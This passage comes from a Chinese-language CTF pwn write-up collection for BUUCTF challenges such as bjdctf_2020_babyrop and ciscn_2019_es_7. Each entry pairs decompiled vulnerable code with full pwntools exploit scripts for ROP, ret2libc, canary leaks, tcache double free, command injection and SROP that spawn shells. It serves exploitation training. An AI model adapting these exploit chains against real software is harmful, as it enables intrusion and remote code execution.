	edit(0,p32(system) + &quot;\n&quot;)
	edit(1,payload + p32(binsh) + &quot;\n&quot;)
	delete(3)
	sh.interactive()
</code></pre>
<h2>bjdctf_2020_babyrop</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>vuln</strong></p>
<pre><code class="language-c">ssize_t vuln()
{
  char buf; // [rsp+0h] [rbp-20h]

  puts(&quot;Pull up your sword and tell me u story!&quot;);
  return read(0, &amp;buf, 0x64uLL);
}
</code></pre>
<blockquote>
<p>溢出+libc leak</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#from LibcSearcher import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,29594)
elf = ELF(&quot;./bjdctf_2020_babyrop&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)

puts_plt = elf.plt[&quot;puts&quot;]
read_got = elf.got[&quot;read&quot;]
main_addr = elf.sym[&quot;main&quot;]
pop_rdi_ret = 0x0000000000400733

payload = &quot;a&quot;*(0x20+8)
payload += p64(pop_rdi_ret)+p64(read_got)
payload += p64(puts_plt)+p64(main_addr)
p.recvuntil(&quot;story!\n&quot;)
p.sendline(payload)

leak_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
#leak_addr = u64(p.recv(0x6))
libc_base = leak_addr-libc.sym[&quot;read&quot;]
sys_addr = libc_base+libc.sym[&quot;system&quot;]
binsh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
'''
libc = LibcSearcher(&quot;read&quot;,leak_addr)
libc_base = leak_addr-libc.dump(&quot;read&quot;)
sys_addr = libc_base+libc.dump(&quot;system&quot;)
binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)
'''
log.info(&quot;libc base=&gt;%x&quot;,libc_base)
log.info(&quot;system addr=&gt;%x&quot;,sys_addr)
log.info(&quot;/bin/sh=&gt;%x&quot;,binsh)

payload = 'a'*(0x20+8)
payload += p64(pop_rdi_ret)+p64(binsh)
payload += p64(sys_addr)
p.sendlineafter(&quot;story!&quot;,payload)
p.interactive()
</code></pre>
<h2>bjdctf_2020_babyrop2</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>gift</strong></p>
<pre><code class="language-c">unsigned __int64 gift()
{
  char format; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;I'll give u some gift to help u!&quot;);
  __isoc99_scanf(&quot;%6s&quot;, &amp;format);
  printf(&amp;format, &amp;format);
  puts(byte_400A05);
  fflush(0LL);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<p><strong>vuln</strong></p>
<pre><code class="language-c">unsigned __int64 vuln()
{
  char buf; // [rsp+0h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;Pull up your sword and tell me u story!&quot;);
  read(0, &amp;buf, 0x64uLL);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<blockquote>
<p>从gift利用字符串格式化漏洞泄露canary，再利用vuln执行漏洞</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf= ELF(&quot;./bjdctf_2020_babyrop2&quot;)
#p = process(&quot;./bjdctf_2020_babyrop2&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;27381&quot;)

p.sendlineafter(&quot;to help u!\n&quot;,&quot;%7$p&quot;)
p.recvuntil(&quot;0x&quot;)
canary=int(p.recv(16),16)
success(&quot;Canary=&gt;0x%x&quot;,canary)

pop_rdi_ret = 0x0400993

payload = 'a'*0x18+p64(canary)+'a'*8
payload += p64(pop_rdi_ret)+p64(elf.got[&quot;puts&quot;])
payload += p64(elf.plt[&quot;puts&quot;])+p64(elf.sym[&quot;vuln&quot;])
p.sendlineafter(&quot;tell me u story!&quot;,payload)

leak = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
libc = LibcSearcher(&quot;puts&quot;,leak)
base = leak-libc.dump(&quot;puts&quot;)
sys_addr = base + libc.dump(&quot;system&quot;)
binsh = base+ libc.dump(&quot;str_bin_sh&quot;)

payload='a'*0x18+p64(canary)+p64(0)
payload+=p64(pop_rdi_ret)+p64(binsh)
payload+=p64(sys_addr)

p.sendlineafter(&quot;!&quot;,payload)
p.interactive()
</code></pre>
<h2>bjdctf_2020_babystack</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts(&quot;**********************************&quot;);
  puts(&quot;*     Welcome to the BJDCTF!     *&quot;);
  puts(&quot;* And Welcome to the bin world!  *&quot;);
  puts(&quot;*  Let's try to pwn the world!   *&quot;);
  puts(&quot;* Please told me u answer loudly!*&quot;);
  puts(&quot;[+]Are u ready?&quot;);
  puts(&quot;[+]Please input the length of your name:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;nbytes);
  puts(&quot;[+]What's u name?&quot;);
  read(0, &amp;buf, (unsigned int)nbytes);
  return 0;
}
</code></pre>
<p><strong>back_door</strong></p>
<pre><code class="language-c">signed __int64 backdoor()
{
  system(&quot;/bin/sh&quot;);
  return 1LL;
}
</code></pre>
<blockquote>
<p>nbytes可以被我们控制，从而造成栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,25325)
p.sendlineafter(&quot;:&quot;,str(0x100))
p.sendlineafter(&quot;?&quot;,'a'*0x18+p64(0x04006EA))
p.interactive()
</code></pre>
<h2>bjdctf_2020_babystack2</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts(&quot;**********************************&quot;);
  puts(&quot;*     Welcome to the BJDCTF!     *&quot;);
  puts(&quot;* And Welcome to the bin world!  *&quot;);
  puts(&quot;*  Let's try to pwn the world!   *&quot;);
  puts(&quot;* Please told me u answer loudly!*&quot;);
  puts(&quot;[+]Are u ready?&quot;);
  puts(&quot;[+]Please input the length of your name:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;nbytes);
  if ( (signed int)nbytes &gt; 10 )
  {
    puts(&quot;Oops,u name is too long!&quot;);
    exit(-1);
  }
  puts(&quot;[+]What's u name?&quot;);
  read(0, &amp;buf, (unsigned int)nbytes);
  return 0;
}
</code></pre>
<blockquote>
<p><code>(signed int)nbytes </code>为正整数，所以存在整数溢出漏洞</p>
</blockquote>
<p><strong>backdoor</strong></p>
<pre><code class="language-c">signed __int64 backdoor()
{
  system(&quot;/bin/sh&quot;);
  return 1LL;
}
</code></pre>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./bjdctf_2020_babystack2&quot;)
#p = process(&quot;./bjdctf_2020_babystack2&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;28949&quot;)

back_door = 0x0400726

payload = 'a'*0x18+p64(back_door)
p.sendlineafter(&quot;:\n&quot;,'-1')
p.sendlineafter(&quot;?\n&quot;,payload)
p.interactive()
</code></pre>
<h2>bjdctf_2020_router</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.运行</h3>
<pre><code>Welcome to BJDCTF router test program!
1.ping
2.test
3.leave comments
4.root
5.exit
Please input u choose:
</code></pre>
<blockquote>
<p>根本不用EXP，考察的是linux的 命令是利用<code>;</code>分割的</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
p = process('./bjdctf_2020_router')
elf = ELF('./bjdctf_2020_router')
context.log_level = 'debug'

p.recv()
p.sendline(&quot;1&quot;)
p.recv()
#p.sendline(';cat flag')
p.sendline(';/bin/sh')
p.interactive()
</code></pre>
<h2>bjdctf_2020_YDSneedGrirlfriend</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>基本功能</p>
<pre><code class="language-python">def add(sz,text):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;)
	sh.sendlineafter(&quot;Her name size is :&quot;,str(sz))
	sh.sendlineafter(&quot;Her name is :&quot;,text)

def delete(idx):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;)
	sh.sendlineafter(&quot;Index :&quot;,str(idx))

def show(idx):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;)
	sh.sendlineafter(&quot;Index :&quot;,str(idx))
</code></pre>
<p><strong>del_girlfriend</strong></p>
<pre><code class="language-c">if ( v1 &gt;= 0 &amp;&amp; v1 &lt; count )
  {
    if ( girlfriendlist[v1] )                   // UAF
    {
      free(*((void **)girlfriendlist[v1] + 1)); // free(chunk)
      free(girlfriendlist[v1]);                 // free(size)
      puts(&quot;Success&quot;);
    }
  }
</code></pre>
<blockquote>
<p>释放后指针没有置0，造成 <strong>use after free</strong></p>
</blockquote>
<p><strong>print_girlfriend_name</strong></p>
<pre><code class="language-c">int __fastcall print_girlfriend_name(__int64 a1)
{
  return puts(*(const char **)(a1 + 8));
}
</code></pre>
<blockquote>
<p>位于所申请的chunk中，可以通过之前的uaf漏洞将其改写</p>
</blockquote>
<p><strong>back_door</strong></p>
<pre><code class="language-c">int backdoor()
{
  puts(&quot;YDS get N+ girlfriend!&quot;);
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<blockquote>
<p>直接覆盖<strong>print_girlfriend_name</strong> 为 <strong>back_door</strong> 就行了</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
elf = ELF('bjdctf_2020_YDSneedGrirlfriend')
libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)
sh = 0

def add(sz,text):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;)
	sh.sendlineafter(&quot;Her name size is :&quot;,str(sz))
	sh.sendlineafter(&quot;Her name is :&quot;,text)

def delete(idx):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;)
	sh.sendlineafter(&quot;Index :&quot;,str(idx))

def show(idx):
	sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;)
	sh.sendlineafter(&quot;Index :&quot;,str(idx))

def main(ip,port,mode,debug):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(&quot;bjdctf_2020_YDSneedGrirlfriend&quot;)
	else:
		sh = remote(ip,port)
	add(0x60,'aaaa')#0
	add(0x60,'bbbb')#1

	delete(0)
	delete(1)

	add(0x10,p64(0x400B9C))
	show(0)
	sh.interactive()

if __name__ == '__main__':
	main(&quot;node3.buuoj.cn&quot;,&quot;27659&quot;,1,1)
</code></pre>
<h2>ciscn_2019_c_1</h2>
<p>环境：Ubuntu18</p>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = stdin;
  setvbuf(stdin, 0LL, 2, 0LL);
  func(v3, 0LL);
  return 0;
}
</code></pre>
<p> func</p>
<pre><code class="language-c">int func()
{
  int result; // eax
  char v1; // [rsp+0h] [rbp-30h]
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts(&quot;Let's guess the number.&quot;);
  gets(&amp;v1);
  if ( v2 == 11.28125 )
    result = system(&quot;cat /flag&quot;);
  else
    result = puts(&quot;Its value should be 11.28125&quot;);
  return result;
}
</code></pre>
<p> string</p>
<pre><code>LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
LOAD:0000000000400399	0000000A	C	libc.so.6
LOAD:00000000004003A3	00000005	C	gets
LOAD:00000000004003A8	00000005	C	puts
LOAD:00000000004003AD	00000006	C	stdin
LOAD:00000000004003B3	00000007	C	stdout
LOAD:00000000004003BA	00000007	C	system
LOAD:00000000004003C1	00000008	C	setvbuf
LOAD:00000000004003C9	00000012	C	__libc_start_main
LOAD:00000000004003DB	0000000F	C	__gmon_start__
LOAD:00000000004003EA	0000000C	C	GLIBC_2.2.5
.rodata:00000000004007B4	00000018	C	Let's guess the number.
.rodata:00000000004007CC	0000000A	C	cat /flag
.rodata:00000000004007D6	0000001D	C	Its value should be 11.28125
.eh_frame:000000000040089F	00000006	C	;*3$\&quot;
</code></pre>
<blockquote>
<p>v1的栈空间覆盖到v2</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,26782)
number_addr = 0x41348000
payload = '\x00'*(0x30-4) + p64(number_addr)
p.sendlineafter(&quot;Let's guess the number.\n&quot;,payload)
print p.recv()
</code></pre>
<blockquote>
<p>number是地址下面保存的16进制值</p>
</blockquote>
<h2>ciscn_2019_en_2</h2>
<p>和ciscn_2019_c_1一样</p>
<h2>ciscn_2019_en_3</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c"> puts(&quot;Welcome to the story kingdom.&quot;);
  puts(&quot;What's your name?&quot;);
  read(0, &amp;buf, 0x20uLL);
  _printf_chk(1LL, (__int64)&amp;buf);
  puts(&quot;Please input your ID.&quot;);
</code></pre>
<blockquote>
<p>字符串格式化漏洞，可以从这里泄露<code>libc base</code></p>
</blockquote>
<p>只有两个有效功能</p>
<pre><code class="language-python">def add(sz,text):
	p.sendlineafter(&quot;: &quot;,&quot;1&quot;)
	p.sendlineafter(&quot;: &quot;,str(sz))
	p.sendlineafter(&quot;: &quot;,text)

def delete(idx):
	p.sendlineafter(&quot;: &quot;,&quot;4&quot;)
	p.sendlineafter(&quot;: &quot;,str(idx))
</code></pre>
<p><strong>main</strong></p>
<pre><code class="language-c">  puts(&quot;Welcome to the story kingdom.&quot;);
  puts(&quot;What's your name?&quot;);
  read(0, &amp;buf, 0x20uLL);
  _printf_chk(1LL, &amp;buf);
  puts(&quot;Please input your ID.&quot;);
  read(0, &amp;s, 8uLL);
  puts(&amp;s);
</code></pre>
<blockquote>
<p>字符串格式化漏洞，<code>printf_chk</code>函数，导致你在使用<code>%a$p</code>时需要同时使用<code>%(1到a)$p</code>才可以，并且<code>禁用了%n</code>，所以利用格式化字符串写的这条路基本被pass掉，只有可能进行一些简单的<code>leak</code></p>
</blockquote>
<p><strong>delete</strong></p>
<pre><code class="language-c">unsigned __int64 delete()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;Please input the index:&quot;);
  _isoc99_scanf(&quot;%d&quot;, &amp;v1);
  free(qword_202068[2 * v1]);
  puts(&quot;Done!&quot;);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<blockquote>
<p>指针未清0</p>
</blockquote>
<h3>3.GDB</h3>
<pre><code class="language-python">#code:
p.sendlineafter('name?','aaaaaa')
	gdb.attach(p)
	p.sendlineafter('ID.','2'*8)
	leak = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	log.success('leak addr =&gt; 0x%x',leak)
#gdb
0x7fffa19cf4b0 ◂— 0x3232323232323232 ('22222222')
0x7fffa19cf4b8 —▸ 0x7fc2db859237 (setbuffer+231) ◂— test   dword ptr [rbx], 0x8000
0x7fffa19cf4c0 ◂— 0xa616161616161 /* 'aaaaaa\n' */
</code></pre>
<blockquote>
<blockquote>
<p>这个时候<code>0x7fffa19cf4b0</code>被填充完全，接着输出就会输出<code>0x7fffa19cf4b8</code>的内容，<code>0x7fffa19cf4b8</code>的内容就是<code>0x7fc2db859237 (setbuffer+231)</code>，所以得出这时的<code>libc_now</code>=<code>0x7fc2db859237 - 231</code>，那么<code>libc base</code> = <code>libc_now - libc.sym[&quot;setbuffer&quot;]</code></p>
</blockquote>
<blockquote>
<p>接着就是填入<code>/bin/sh</code>，改<code>_free_hook</code>为<code>system</code></p>
</blockquote>
</blockquote>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./ciscn_2019_en_3&quot;)
libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.27.so&quot;)
#p = process(&quot;./ciscn_2019_en_3&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;27106&quot;)

def add(sz,text):
	p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;: \n&quot;,str(sz))
	p.sendlineafter(&quot;: \n&quot;,text)

def delete(idx):
	p.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:\n&quot;,str(idx))

if __name__ == '__main__':
	p.sendlineafter('name?','aaaaaa')
	p.sendlineafter('ID.','2'*8)
	libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-231-libc.sym['setbuffer']
	free_hook=libcbase+libc.sym['__free_hook']
	system=libcbase+libc.sym['system']
	log.success('libc base =&gt; 0x%x',libcbase)
	log.success('free hook =&gt; %x',free_hook)
	log.success('sys addr =&gt; 0x%x',system)
	add(0x20,'aaaa')#0
	add(0x20,'/bin/sh\x00')
	delete(0)
	delete(0) #double free
	add(0x20,p64(free_hook))
	add(0x20,'dd')
	add(0x20,p64(system))
	delete(1)
	p.interactive()
</code></pre>
<h2>ciscn_2019_es_1</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<pre><code class="language-python">def add(sz,name,call):
	p.sendlineafter(&quot;choice:&quot;,'1')
	p.sendlineafter(&quot;Please input the size of compary's name\n&quot;,str(sz))
	p.sendlineafter(&quot;please input name:&quot;,name)
	p.sendlineafter(&quot;please input compary call:&quot;,call)

def show(idx):
	p.sendlineafter(&quot;choice:&quot;,'2')
	p.sendlineafter(&quot;index:\n&quot;,str(idx))

def free(idx):
	p.sendlineafter(&quot;choice:&quot;,'3')
	p.sendlineafter(&quot;index:\n&quot;,str(idx))
</code></pre>
<p><strong>add</strong></p>
<pre><code class="language-c">	puts(&quot;please input name:&quot;);
  	read(0, (void *)*heap_addr_4080[heap_number], (unsigned int)size);
</code></pre>
<p>这个可以直接让我们写到chunk-&gt;fd的位置</p>
<p><strong>call</strong></p>
<pre><code class="language-c"> if ( heap_addr_4080[v1] )
    free((void *)*heap_addr_4080[v1]);
  puts(&quot;You try it!&quot;);
  puts(&quot;Done&quot;);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<blockquote>
<p>这里没有释放后没有清零，use after free</p>
</blockquote>
<p><strong>思路</strong></p>
<ul>
<li>1.利用<code>show</code>函数泄露libc</li>
<li>2.程序里面有个<strong>uaf</strong>，利用这个进行<strong>double_free</strong>来修改tcache里面的<strong>fd</strong>指针，从而将<code>free_hook</code>改为<code>_libc_system</code></li>
<li>3.<code>free</code>掉我们提前埋下的**/bin/sh**的chunk，从而getshell</li>
</ul>
<h3>3.gdb</h3>
<h4>利用<code>show</code>函数泄露libc</h4>
<pre><code class="language-python">	add(0x410,'aaaa','123')
	add(0x20,&quot;bbbb&quot;,'124')
	add(0x20,&quot;/bin/sh\x00&quot;,'125')

	free(0)
	show(0)
</code></pre>
<p><img src="https://s1.ax1x.com/2020/08/05/ar0ES1.png" alt="leak.png" /></p>
<h4>2.程序里面有个<strong>uaf</strong>，利用这个进行<strong>double_free</strong>来修改tcache里面的<strong>fd</strong>指针，从而将<code>free_hook</code>改为<code>_libc_system</code></h4>
<ul>
<li>double free</li>
</ul>
<pre><code class="language-python">	free(1)
	free(1)
</code></pre>
<p>​	gdb</p>
<pre><code>pwndbg&gt; bin
tcachebins
0x30 [  2]: 0x55ce4a46d6c0 ◂— 0x55ce4a46d6c0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55ce4a46d270 —▸ 0x7ff520e96ca0 (main_arena+96) ◂— 0x55ce4a46d270
smallbins
empty
largebins
empty
</code></pre>
<ul>
<li>
<p>修改free_hook</p>
<pre><code class="language-python">	add(0x28,p64(free_hook),'126')
	add(0x28,'111','127')
	add(0x28,p64(system),'128')
</code></pre>
<p><img src="https://s1.ax1x.com/2020/08/05/arBt3R.png" alt="edit.png" /></p>
</li>
</ul>
<h3>4.EXP</h3>
<blockquote>
<p>这里是改<code>free</code>为<code>system</code>，所以就必须先libc leak，</p>
</blockquote>
<pre><code class="language-python">from pwn import *
elf = ELF(&quot;ciscn_s_6&quot;)
libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
sh = 0

def add(sz,name,call):
	sh.sendlineafter(&quot;choice:&quot;,'1')
	sh.sendlineafter(&quot;Please input the size of compary's name\n&quot;,str(sz))
	sh.sendlineafter(&quot;please input name:&quot;,name)
	sh.sendlineafter(&quot;please input compary call:&quot;,call)

def show(idx):
	sh.sendlineafter(&quot;choice:&quot;,'2')
	sh.sendlineafter(&quot;index:\n&quot;,str(idx))

def free(idx):
	sh.sendlineafter(&quot;choice:&quot;,'3')
	sh.sendlineafter(&quot;index:\n&quot;,str(idx))

def main(ip,port,debug,mode):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(&quot;ciscn_s_6&quot;)
	else:
		sh = remote(ip,port)
	add(0x410,'aaaa','123')
	add(0x20,&quot;bbbb&quot;,'124')
	add(0x20,&quot;/bin/sh\x00&quot;,'125')

	free(0)
	show(0)
	#0x7fffff3ebca0 (main_arena+96)
	leak_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	libc_base = leak_addr-96-0x10-libc.sym[&quot;__malloc_hook&quot;]
	free_hook=libc_base+libc.sym[&quot;__free_hook&quot;]
	system = libc_base+libc.sym[&quot;system&quot;]

	log.info(&quot;libc base=&gt;%x&quot;,libc_base)
	log.info(&quot;free_hook=&gt;%x&quot;,free_hook)
	log.info(&quot;system real=&gt;%x&quot;,system)
	#double free
	free(1)
	free(1)
	add(0x28,p64(free_hook),'126')
	add(0x28,'111','127')
	add(0x28,p64(system),'128')
	#GDB()
	free(2)

	sh.interactive()
if __name__ == '__main__':
	main(&quot;node3.buuoj.cn&quot;,&quot;28066&quot;,0,0)
</code></pre>
<blockquote>
<p>为什么是0x3c4b78？</p>
<blockquote>
<p>动态调试出来，泄露的<code>unsorted bin</code>地址减去vmmap下查看的<code>libc基址</code></p>
</blockquote>
<p>add(0x410,'aaaa','123')，为什么是0x410？</p>
<blockquote>
<p>因为<code>add</code>对申请的堆的大小没有限制，而申请一个大的堆块(&gt;0x400)，这个堆块被<code>free</code>后就会直接被分配进入<code>unsorted bin</code></p>
</blockquote>
</blockquote>
<h2>ciscn_2019_es_2</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts(&quot;Welcome, my friend. What's your name?&quot;);
  vul();
  return 0;
}
</code></pre>
<p><strong>vul</strong></p>
<pre><code class="language-c">int vul()
{
  char s; // [esp+0h] [ebp-28h]

  memset(&amp;s, 0, 0x20u);
  read(0, &amp;s, 0x30u);
  printf(&quot;Hello, %s\n&quot;, &amp;s);
  read(0, &amp;s, 0x30u);
  return printf(&quot;Hello, %s\n&quot;, &amp;s);
}
</code></pre>
<p><strong>hack</strong></p>
<pre><code class="language-c">int hack()
{
  return system(&quot;echo flag&quot;);
}
</code></pre>
<blockquote>
<p>因为有system，可以不用libc_leak,但是要泄露EBP</p>
</blockquote>
<pre><code>====system(&quot;/bin/sh\x00&quot;)
====must size()=0x28=40
====then can overflow
| a*4 |
| a*4 |
| Addr_1 |
| b*4 |
| sys_plt |
| sys_ret |
| Addr_2 |
| /bin |
| /sh\x00 |
| 对齐 |
=====ret_addr:
| Addr_3 |
==========
0x28+4=44=0x2c= Addr_3
Addr_1=44-4-4=36=0x24
Addr_2=44-4*5=24=0x1c(sys_ret不在ebp上偏移传参)
</code></pre>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,29643)
elf = ELF(&quot;./ciscn_2019_es_2&quot;)

sys_addr = 0x8048400 
#-------EBP_LEAK-------------
pl = 'a'*0x20+&quot;b&quot;*8
p.send(pl)
p.recvuntil('b'*8)
ebp = u32(p.recv(4))
print(hex(ebp))

pl2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_addr)+'cccc'+p32(ebp-0x1c)+'/bin/sh\x00').ljust(0x28,'p')+p32(ebp-0x2c)
								#p32(sys_addr)+'aaaa'+p32(sh_addr)
p.send(pl2)

p.interactive()
</code></pre>
<h2>ciscn_2019_es_7</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>vuln</strong></p>
<pre><code class="language-assembly">; read(fd,buf,0x400)
; write(fd,buf,0x30)
; Attributes: bp-based frame
                public vuln
vuln            proc near               ; CODE XREF: main+14↓p
buf             = byte ptr -10h
; __unwind {
                push    rbp
                mov     rbp, rsp
                xor     rax, rax
                mov     edx, 400h       ; count
                lea     rsi, [rsp+buf]  ; buf
                mov     rdi, rax        ; fd
                syscall                 ; LINUX - sys_read
                mov     rax, 1
                mov     edx, 30h        ; count
                lea     rsi, [rsp+buf]  ; buf
                mov     rdi, rax        ; fd
                syscall                 ; LINUX - sys_write
                retn
vuln            endp ; sp-analysis failed
; ---------------------------------------------------------------------------
                db 90h
; ---------------------------------------------------------------------------
                pop     rbp
                retn
; } // starts at 4004ED
</code></pre>
<blockquote>
<p>分析<code>syscall</code>，发现只有<code>read</code>和<code>write</code>。</p>
</blockquote>
<p><strong>gadgets</strong></p>
<pre><code class="language-assembly">gadgets         proc near
; __unwind {
                push    rbp
                mov     rbp, rsp
                mov     rax, 0Fh        ; //constants.SYS_sigreturn
                retn
gadgets         endp ; sp-analysis failed
; ---------------------------------------------------------------------------
                mov     rax, 3Bh        ; //execve
                retn
; ---------------------------------------------------------------------------
                db 90h
; ---------------------------------------------------------------------------
                pop     rbp
                retn
; } // starts at 4004D6
</code></pre>
<blockquote>
<p><code>mov     rax, 0Fh</code>: 在syscall里面，<strong>0xf</strong>代表<code>constants.SYS_sigreturn</code></p>
<p><code>mov     rax, 3Bh</code>: 在syscall里面，<strong>0x3b</strong>代表<code>execve</code></p>
<p>所以要用<a href="https://www.freebuf.com/articles/network/87447.html">SROP</a></p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
#sh=process(&quot;./ciscn_2019_es_7&quot;)
context.log_level ='debug' 
context.arch='amd64'
sh=remote(&quot;node3.buuoj.cn&quot;,27162)
syscall_ret=0x400517
read=0x4004f1
movrax_sigreturn=0x4004da
movrax_system=0x4004E2
sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(read))
sh.recv(32)
stack_addr=u64(sh.recv(8))
log.success(&quot;stack: &quot;+hex(stack_addr))
sh.recv(8)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr - 280  # &quot;/bin/sh&quot; 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
